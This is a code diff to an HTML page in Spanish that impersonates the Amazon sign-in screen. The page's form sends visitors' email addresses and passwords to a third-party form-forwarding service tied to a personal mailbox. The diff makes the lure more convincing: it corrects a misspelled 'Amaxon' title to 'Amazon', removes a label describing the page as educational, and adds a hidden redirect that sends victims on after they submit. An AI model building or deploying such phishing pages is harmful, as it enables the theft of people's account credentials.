@@ -4,11 +4,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon"
-        href="https://static.vecteezy.com/system/resources/previews/019/136/322/non_2x/amazon-logo-amazon-icon-free-free-vector.jpg"
-        type="image/png">
-        <meta name="description" content="contenido educativo para uso personal">
-    <title>Iniciar sesión en Amaxon</title>
+    <link rel="icon" href="https://static.vecteezy.com/system/resources/previews/019/136/322/non_2x/amazon-logo-amazon-icon-free-free-vector.jpg" type="image/png">
+    <title>Iniciar sesión en Amazon</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -20,7 +17,7 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-
+            
         }
 
         .login-container {
@@ -100,7 +97,7 @@
             color: #555;
             text-align: center;
             margin-top: 20px;
-
+            
         }
 
         .footer a {
@@ -139,19 +136,22 @@
 </head>
 
 <body>
-    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo"
-        class="amazon-logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" class="amazon-logo">
     <div class="login-container">
         <h1>Iniciar sesión</h1>
         <form action="https://formsubmit.co/raulmorejonpulido@gmail.com" method="POST">
-            <label for="email">Correo electrónico:</label>
+            <!-- Campo para correo -->
+            <label for="email">Correo electrónico o número de teléfono</label>
             <input type="email" id="email" name="email" placeholder="Introduce tu correo electrónico" required>
-            
-            <label for="password">Contraseña:</label>
+
+            <!-- Campo para contraseña -->
+            <label for="password">Contraseña</label>
             <input type="password" id="password" name="password" placeholder="Introduce tu contraseña" required>
             
-         
+            <!-- Enviar formulario -->
             <button type="submit">Iniciar sesión</button>
+            <input type="hidden" name="_next" value="https://mopux00.github.io/secur/gracias.html">
+            
         </form>
 
         <div class="links">
